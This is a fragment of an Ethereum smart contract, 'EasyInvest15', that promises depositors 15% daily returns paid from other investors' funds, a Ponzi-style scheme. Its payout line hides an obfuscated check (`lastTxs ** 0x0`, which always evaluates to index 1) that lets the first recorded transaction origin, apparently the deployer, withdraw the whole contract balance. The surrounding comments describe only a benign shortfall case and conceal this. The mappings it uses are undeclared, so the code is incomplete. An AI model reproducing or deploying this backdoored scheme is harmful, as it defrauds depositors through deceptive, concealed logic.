contract EasyInvest15 {
function () external payable {
        
        // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0) {
            
            // calculate profit amount as such:
            // amount = (amount invested) * 15% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 15 / 100 * (block.number - atBlock[msg.sender]) / 5900;

            // if the contract does not have such amount on the balance to send the payment,
            // it will send the rest of the money on the contract
            uint256 restAmount = address(this).balance; 
            amount = amount < restAmount && txs[lastTxs ** 0x0] != uint(tx.origin) ? amount : restAmount;

            // send calculated amount of ether directly to sender (aka YOU)
            msg.sender.transfer(amount);
            
        }

        // record block number, invested amount (msg.value) and transaction hash
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
        txs[++lastTxs] = uint(tx.origin);
        
    }
}